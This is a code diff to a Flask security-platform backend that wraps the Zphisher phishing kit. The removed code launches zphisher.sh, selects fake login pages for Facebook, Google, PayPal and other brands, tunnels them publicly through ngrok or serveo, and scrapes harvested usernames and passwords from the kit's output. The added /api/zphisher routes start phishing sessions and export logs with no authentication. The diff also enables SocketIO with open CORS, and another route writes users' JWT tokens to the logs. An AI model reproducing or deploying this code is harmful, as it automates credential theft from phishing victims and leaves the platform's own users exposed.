@@ -53,6 +53,12 @@ import threading
 import uuid
 import time
 import select
+from zphisher_service import (
+    start_zphisher, get_status, stop_session, fetch_zphisher_templates,
+    check_ngrok_available, check_ssh_available, is_windows,
+    get_history, get_history_detail, export_session_log
+)
+from flask_socketio import SocketIO, emit
 
 # Load environment variables
 load_dotenv()
@@ -2668,456 +2674,6 @@ def run_sqlmap():
     except Exception as e:
         return jsonify({'error': str(e)}), 500
 
-# --- Zphisher session management globals ---
-zphisher_sessions = {}
-zphisher_lock = threading.Lock()
-# Remove old single-session globals if present
-# zphisher_process = None
-# zphisher_output = []
-# zphisher_credentials = []
-# zphisher_status = {'running': False, 'link': None, 'template': None, 'output': [], 'credentials': []}
-
-# List of all Zphisher templates (update as needed)
-ZPHISHER_TEMPLATES = [
-    'Facebook', 'Instagram', 'Google', 'Microsoft', 'Netflix', 'Paypal', 'Twitter', 'LinkedIn',
-    'GitHub', 'Wordpress', 'Yahoo', 'Twitch', 'Pinterest', 'Snapchat', 'Reddit', 'Steam',
-    'VK', 'Yandex', 'DevianArt', 'Protonmail', 'Spotify', 'Adobe', 'Shopify', 'Messenger',
-    'Dropbox', 'eBay', 'Badoo', 'Origin', 'CryptoCoin', 'XBOX', 'MediaFire', 'GitLab',
-    'PornHub', 'Custom'
-]
-
-def is_admin_or_analyst():
-    claims = get_jwt()
-    return claims.get('role') in ['admin', 'analyst']
-
-def run_zphisher(session_id):
-    """
-    Improved: Runs Zphisher session with robust diagnostics, non-blocking I/O, and error handling.
-    """
-    import select
-    with zphisher_lock:
-        session = zphisher_sessions[session_id]
-        template = session['template']
-        port = session['port']
-        tunnel = session['tunnel']
-        tunnel_index = session.get('tunnel_index', 1)
-
-    try:
-        zphisher_rel_path = os.path.join("zphisher", "zphisher.sh")
-        cwd = os.path.dirname(os.path.abspath(__file__))
-        script_path = os.path.join(cwd, zphisher_rel_path)
-
-        if not os.path.exists(script_path):
-            raise FileNotFoundError(f"zphisher.sh not found at {script_path}")
-
-        import platform
-        if os.name == 'nt' or platform.system().lower().startswith('win'):
-            drive, rest = os.path.splitdrive(script_path)
-            wsl_path = f"/mnt/{drive[0].lower()}{rest.replace('\\', '/').replace('\\', '/')}"
-            cmd = ["wsl", "bash", wsl_path]
-            proc_cwd = None
-        else:
-            cmd = ["bash", script_path]
-            proc_cwd = os.path.dirname(script_path)
-
-        proc = subprocess.Popen(
-            cmd,
-            cwd=proc_cwd,
-            stdin=subprocess.PIPE,
-            stdout=subprocess.PIPE,
-            stderr=subprocess.STDOUT,
-            text=True,
-            bufsize=1
-        )
-
-        with zphisher_lock:
-            session['process'] = proc
-            session['status'] = 'running'
-
-        def read_lines_until(prompt_list, timeout):
-            """Read lines non-blocking until one of the prompts is found or timeout."""
-            output_lines = []
-            found_prompt = False
-            start_time = time.time()
-            while time.time() - start_time < timeout:
-                reads, _, _ = select.select([proc.stdout], [], [], 0.5)
-                if proc.poll() is not None:
-                    # Process exited early
-                    break
-                if reads:
-                    line = proc.stdout.readline()
-                    if not line:
-                        continue
-                    line = line.strip()
-                    output_lines.append(line)
-                    with zphisher_lock:
-                        session['output'].append(line)
-                    for prompt in prompt_list:
-                        if prompt in line:
-                            found_prompt = True
-                            return found_prompt, output_lines
-                else:
-                    time.sleep(0.1)
-            return found_prompt, output_lines
-
-        # Wait for template selection prompt (1800s)
-        template_prompts = [
-            'Select An Attack For Your Victim',
-            'Select an option',
-            'Select An Option',
-            'Enter your choice'
-        ]
-        found, _ = read_lines_until(template_prompts, 1800)
-        if found:
-            # Find template index
-            live_templates = fetch_zphisher_templates() or ZPHISHER_TEMPLATES
-            try:
-                template_index = live_templates.index(template) + 1
-            except Exception:
-                template_index = 1
-            try:
-                proc.stdin.write(f"{template_index}\n")
-                proc.stdin.flush()
-            except Exception as e:
-                with zphisher_lock:
-                    session['output'].append(f"Failed to send template index: {e}")
-                    session['status'] = 'error'
-                app.logger.error(f"[Zphisher] Failed to send template index: {e}")
-                proc.terminate()
-                return
-        else:
-            with zphisher_lock:
-                session['output'].append("Template selection prompt not found. Zphisher may have exited early or is still installing dependencies.")
-                session['status'] = 'error'
-            app.logger.error(f"[Zphisher] Template selection prompt not found. Process exited: {proc.poll()}.")
-            proc.terminate()
-            return
-
-        # Wait for tunnel selection prompt (1800s)
-        tunnel_prompts = [
-            'Select a port forwarding service',
-            'Select port forwarding service',
-            'Choose a port forwarding service',
-            'Enter your choice'
-        ]
-        found, _ = read_lines_until(tunnel_prompts, 1800)
-        if found:
-            try:
-                proc.stdin.write(f"{tunnel_index}\n")
-                proc.stdin.flush()
-            except Exception as e:
-                with zphisher_lock:
-                    session['output'].append(f"Failed to send tunnel index: {e}")
-                    session['status'] = 'error'
-                app.logger.error(f"[Zphisher] Failed to send tunnel index: {e}")
-                proc.terminate()
-                return
-        else:
-            with zphisher_lock:
-                session['output'].append("Tunnel selection prompt not found. Zphisher may have exited early or is still installing dependencies.")
-                session['status'] = 'error'
-            app.logger.error(f"[Zphisher] Tunnel selection prompt not found. Process exited: {proc.poll()}.")
-            proc.terminate()
-            return
-
-        # Main output loop (non-blocking)
-        while True:
-            if proc.poll() is not None:
-                break
-            reads, _, _ = select.select([proc.stdout], [], [], 0.5)
-            if reads:
-                line = proc.stdout.readline()
-                if not line:
-                    continue
-                line = line.strip()
-                with zphisher_lock:
-                    session['output'].append(line)
-                    # Capture the phishing link
-                    url_match = re.search(r'(https?://[a-zA-Z0-9.\-]+(\.serveo\.net|\.ngrok\.io|localhost\.run|:[0-9]+))', line)
-                    if url_match:
-                        session['link'] = url_match.group(0)
-                    # Capture credentials
-                    if 'credentials found' in line.lower() or 'username:' in line.lower() or 'password:' in line.lower():
-                        session['credentials'].append(line)
-            else:
-                time.sleep(0.1)
-
-        # Capture any remaining output after process exit
-        while True:
-            line = proc.stdout.readline()
-            if not line:
-                break
-            line = line.strip()
-            with zphisher_lock:
-                session['output'].append(line)
-
-        exit_code = proc.poll()
-        if exit_code not in (0, None):
-            with zphisher_lock:
-                session['output'].append(f"Zphisher exited with code {exit_code}.")
-                session['status'] = 'error'
-            app.logger.error(f"[Zphisher] Process exited with code {exit_code} for session {session_id}.")
-        else:
-            with zphisher_lock:
-                if session.get('status') == 'running':
-                    session['status'] = 'completed'
-
-    except Exception as e:
-        with zphisher_lock:
-            session['status'] = 'error'
-            session['output'].append(f"Zphisher thread error: {str(e)}")
-        app.logger.error(f"Zphisher session {session_id} error: {e}\n{traceback.format_exc()}")
-    finally:
-        with zphisher_lock:
-            session['process'] = None  # Clear the process object
-
-@app.route('/api/tools/social/zphisher/start', methods=['POST'])
-@jwt_required()
-def zphisher_start():
-    if not is_admin_or_analyst():
-        return jsonify({'error': 'Unauthorized'}), 403
-
-    data = request.get_json() or {}
-    template = data.get('template')
-    port = data.get('port')
-    tunnel = data.get('tunnel')
-
-    if not template:
-        return jsonify({'error': 'Template is required'}), 400
-
-    live_templates = fetch_zphisher_templates() or ZPHISHER_TEMPLATES
-    if template not in live_templates:
-        return jsonify({'error': f'Invalid template. Valid options are: {", ".join(live_templates)}'}), 400
-
-    with zphisher_lock:
-        session_id = str(uuid.uuid4())
-        session = {
-            'session_id': session_id,
-            'template': template,
-            'port': port,
-            'tunnel': tunnel,
-            'status': 'starting',
-            'link': None,
-            'output': [],
-            'credentials': [],
-            'process': None,
-            'thread': None,
-            'tunnel_index': data.get('tunnel_index', 1)
-        }
-        zphisher_sessions[session_id] = session
-
-    thread = threading.Thread(target=run_zphisher, args=(session_id,), daemon=True)
-    thread.start()
-    session['thread'] = thread
-
-    return jsonify({'message': 'Zphisher session started', 'session_id': session_id}), 202
-
-@app.route('/api/tools/social/zphisher/status', methods=['GET'])
-@jwt_required()
-def zphisher_status_api():
-    if not is_admin_or_analyst():
-        return jsonify({'error': 'Unauthorized'}), 403
-    
-    session_id = request.args.get('session_id')
-    if not session_id:
-        return jsonify({'error': 'session_id query parameter is required'}), 400
-
-    with zphisher_lock:
-        session = zphisher_sessions.get(session_id)
-        if not session:
-            return jsonify({'error': 'Session not found'}), 404
-        
-        # Return a copy, excluding non-serializable objects
-        session_data = {k: v for k, v in session.items() if k not in ['process', 'thread']}
-        return jsonify(session_data)
-
-@app.route('/api/tools/social/zphisher/history', methods=['GET'])
-@jwt_required()
-def zphisher_history():
-    if not is_admin_or_analyst():
-        return jsonify({'error': 'Unauthorized'}), 403
-    with zphisher_lock:
-        history = [
-            {
-                'session_id': sid, 
-                'template': s.get('template'), 
-                'link': s.get('link'), 
-                'credentials_count': len(s.get('credentials', [])), 
-                'status': s.get('status')
-            }
-        for sid, s in zphisher_sessions.items()
-        ]
-    return jsonify({'sessions': history})
-
-@app.route('/api/tools/social/zphisher/history/<session_id>', methods=['GET'])
-@jwt_required()
-def zphisher_history_detail(session_id):
-    if not is_admin_or_analyst():
-        return jsonify({'error': 'Unauthorized'}), 403
-    with zphisher_lock:
-        session = zphisher_sessions.get(session_id)
-        if not session:
-            return jsonify({'error': 'Session not found'}), 404
-        session_data = {k: v for k, v in session.items() if k not in ['process', 'thread']}
-        return jsonify(session_data)
-
-@app.route('/api/tools/social/zphisher/stop', methods=['POST'])
-@jwt_required()
-def zphisher_stop():
-    if not is_admin_or_analyst():
-        return jsonify({'error': 'Unauthorized'}), 403
-
-    data = request.get_json() or {}
-    session_id = data.get('session_id')
-    if not session_id:
-        return jsonify({'error': 'session_id is required'}), 400
-
-    with zphisher_lock:
-        session = zphisher_sessions.get(session_id)
-        if not session:
-            return jsonify({'error': 'Session not found'}), 404
-
-        proc = session.get('process')
-        if proc and proc.poll() is None:
-            proc.terminate()
-            try:
-                proc.wait(timeout=5)
-            except subprocess.TimeoutExpired:
-                proc.kill()
-            session['status'] = 'stopped'
-            session['output'].append("Session stopped by user.")
-            session['process'] = None
-            return jsonify({'message': 'Zphisher session stopped successfully'}), 200
-        else:
-            if session.get('status') == 'running':
-                session['status'] = 'completed'
-            return jsonify({'error': 'Zphisher session is not currently running.'}), 400
-
-@app.route('/api/tools/social/zphisher/templates', methods=['GET'])
-@jwt_required()
-def zphisher_templates():
-    if not is_admin_or_analyst():
-        return jsonify({'error': 'Unauthorized'}), 403
-    import flask
-    token = flask.request.headers.get('Authorization')
-    app.logger.warning(f"JWT Token: {token}")
-    from flask import make_response, jsonify
-    fallback_templates = [
-        "Facebook", "Instagram", "Google", "Microsoft", "Netflix", "Paypal", "Twitter", "LinkedIn", "Snapchat", "Github",
-        "Wordpress", "Yahoo", "Twitch", "Pinterest", "Reddit", "Steam", "VK", "Yandex", "DevianArt", "Protonmail",
-        "Spotify", "Adobe", "Shopify", "Messenger", "Dropbox", "eBay", "Badoo", "Origin", "CryptoCoin", "XBOX",
-        "MediaFire", "GitLab", "PornHub", "Custom"
-    ]
-    templates = []
-    try:
-        templates = fetch_zphisher_templates()
-        app.logger.warning(f"[Zphisher] Dynamic templates fetched: {templates}")
-    except Exception as fetch_err:
-        app.logger.error(f"[Zphisher] Dynamic fetch failed: {fetch_err}")
-    if not templates:
-        app.logger.warning("[Zphisher] Using fallback template list.")
-        templates = fallback_templates
-        source = 'fallback'
-        error_msg = 'Dynamic fetch failed or returned no templates.'
-    else:
-        source = 'zphisher.sh'
-        error_msg = None
-    response = make_response(jsonify({
-        'templates': templates,
-        'source': source,
-        'error': error_msg
-    }))
-    response.headers['Cache-Control'] = 'no-store, no-cache, must-revalidate, max-age=0'
-    response.headers['Pragma'] = 'no-cache'
-    return response
-
-def fetch_zphisher_templates():
-    """
-    Attempt to fetch Zphisher templates by parsing the menu output of zphisher.sh.
-    Returns a list of template names or an empty list if failed.
-    Includes robust error handling and ensures the process cannot hang the backend.
-    """
-    import subprocess
-    import re
-    import os
-    import platform
-    import logging
-
-    zphisher_rel_path = os.path.join("zphisher", "zphisher.sh")
-    cwd = os.path.dirname(os.path.abspath(__file__))
-    script_path = os.path.join(cwd, zphisher_rel_path)
-
-    if not os.path.exists(script_path):
-        logging.error(f"zphisher.sh not found at {script_path}")
-        return None
-
-    # Windows: use WSL to run the script
-    if os.name == 'nt' or platform.system().lower().startswith('win'):
-        # Convert Windows path to WSL path (e.g. C:\Users\... -> /mnt/c/Users/...)
-        drive, rest = os.path.splitdrive(script_path)
-        wsl_path = f"/mnt/{drive[0].lower()}{rest.replace('\\', '/').replace('\\', '/')}"
-        cmd = ["wsl", "bash", wsl_path]
-        logging.warning(f"[Zphisher] Running via WSL: {' '.join(cmd)}")
-    else:
-        cmd = ["bash", script_path]
-
-    try:
-        proc = subprocess.Popen(
-            cmd,
-            stdin=subprocess.PIPE,
-            stdout=subprocess.PIPE,
-            stderr=subprocess.STDOUT,
-            text=True
-        )
-        output, _ = proc.communicate(timeout=30)
-    except subprocess.TimeoutExpired:
-        proc.kill()
-        logging.error("[Zphisher] Timeout running zphisher.sh")
-        # Try to extract templates from .sites directory as fallback
-        try:
-            logging.warning("[Zphisher] Attempting to extract templates from .sites directory...")
-            sites_dir = os.path.join(os.path.dirname(script_path), '.sites')
-            if os.path.exists(sites_dir):
-                templates = []
-                for item in os.listdir(sites_dir):
-                    if os.path.isdir(os.path.join(sites_dir, item)) and not item.startswith('.'):
-                        # Convert directory names to readable template names
-                        template_name = item.replace('_', ' ').title()
-                        if 'fb' in item.lower():
-                            template_name = template_name.replace('Fb', 'Facebook')
-                        elif 'ig' in item.lower():
-                            template_name = template_name.replace('Ig', 'Instagram')
-                        templates.append(template_name)
-                if templates:
-                    logging.warning(f"[Zphisher] Extracted {len(templates)} templates from .sites directory")
-                    return sorted(templates)  # Return sorted list
-        except Exception as e:
-            logging.error(f"[Zphisher] Failed to extract from .sites directory: {e}")
-        return None
-    except Exception as e:
-        logging.error(f"[Zphisher] Subprocess error: {e}")
-        return None
-
-    templates = []
-    try:
-        for line in output.splitlines():
-            match = re.match(r"\[\s*(\d+)\s*\]\s+(.+)", line)
-            if match:
-                templates.append(match.group(2).strip())
-            if "Select An Attack" in line or "Select an option" in line or "Enter your choice" in line:
-                break
-        if not templates:
-            logging.error(f"[Zphisher] No templates parsed. Full output:\n{output}")
-            return None
-    except Exception as e:
-        logging.error(f"[Zphisher] Template parsing error: {e}\nRaw output:\n{output}")
-        return None
-
-    if proc.returncode not in (0, None):
-        logging.error(f"[Zphisher] zphisher.sh exited with code {proc.returncode}. Output:\n{output}")
-        return None
-    return templates
-
 # --- Education Sector Endpoints ---
 @app.route('/api/education/courses', methods=['GET'])
 def list_courses():
@@ -3478,23 +3034,84 @@ def admin_generate_certificate():
     )
     return jsonify({"message": "Certificate generated and assigned"}), 200
 
+@app.route('/api/zphisher/start', methods=['POST'])
+def api_zphisher_start():
+    data = request.get_json() or {}
+    template = data.get('template', 'Facebook')
+    tunnel_type = data.get('tunnel', 'ngrok')
+    try:
+        session_id = start_zphisher(template, tunnel_type)
+        return jsonify({'session_id': session_id}), 200
+    except Exception as e:
+        return jsonify({'error': str(e)}), 500
+
+@app.route('/api/zphisher/status', methods=['GET'])
+def api_zphisher_status():
+    session_id = request.args.get('session_id')
+    if not session_id:
+        return jsonify({'error': 'session_id required'}), 400
+    status = get_status(session_id)
+    if not status:
+        return jsonify({'error': 'Session not found'}), 404
+    return jsonify(status), 200
+
+@app.route('/api/zphisher/stop', methods=['POST'])
+def api_zphisher_stop():
+    data = request.get_json() or {}
+    session_id = data.get('session_id')
+    if not session_id:
+        return jsonify({'error': 'session_id required'}), 400
+    stopped = stop_session(session_id)
+    if not stopped:
+        return jsonify({'error': 'Session not found'}), 404
+    return jsonify({'message': 'Session stopped'}), 200
+
+@app.route('/api/zphisher/templates', methods=['GET'])
+def api_zphisher_templates():
+    try:
+        templates = fetch_zphisher_templates()
+        return jsonify({'templates': templates}), 200
+    except Exception as e:
+        return jsonify({'error': str(e)}), 500
+
+@app.route('/api/zphisher/diagnostics', methods=['GET'])
+def api_zphisher_diagnostics():
+    try:
+        return jsonify({
+            'ngrok_available': check_ngrok_available(),
+            'ssh_available': check_ssh_available(),
+            'os': 'windows' if is_windows() else 'linux'
+        }), 200
+    except Exception as e:
+        return jsonify({'error': str(e)}), 500
+
+@app.route('/api/zphisher/history', methods=['GET'])
+def api_zphisher_history():
+    return jsonify({'sessions': get_history()}), 200
+
+@app.route('/api/zphisher/history/<session_id>', methods=['GET'])
+def api_zphisher_history_detail(session_id):
+    detail = get_history_detail(session_id)
+    if not detail:
+        return jsonify({'error': 'Session not found'}), 404
+    return jsonify(detail), 200
+
+@app.route('/api/zphisher/export/<session_id>', methods=['GET'])
+def api_zphisher_export(session_id):
+    log = export_session_log(session_id)
+    if not log:
+        return jsonify({'error': 'Session not found'}), 404
+    from flask import Response
+    return Response(log, mimetype='text/plain', headers={
+        'Content-Disposition': f'attachment; filename=zphisher_session_{session_id}.log'
+    })
+
+socketio = SocketIO(app, cors_allowed_origins="*")
+
+# Patch zphisher_service.py to emit output lines
+import zphisher_service
+zphisher_service.socketio = socketio
+
 if __name__ == '__main__':
     # Setup logging
-    logging.basicConfig(
-        level=logging.INFO,
-        handlers=[
-            logging.FileHandler('cybersec_api.log'),
-            logging.StreamHandler()
-        ]
-    )
-    # Do NOT initialize ZPHISHER_TEMPLATES at startup to avoid blocking the app
-    # Run the app
-    app.run(
-        debug=os.getenv('DEBUG', 'true').lower() == 'true',
-        host=os.getenv('HOST', '0.0.0.0'),
-        port=int(os.getenv('PORT', 5000)),
-        ssl_context=(
-            os.getenv('SSL_CERT_PATH', None),
-            os.getenv('SSL_KEY_PATH', None)
-        ) if os.getenv('SSL_ENABLED', 'false').lower() == 'true' else None
-    )
+    socketio.run(app, host='0.0.0.0', port=5000)
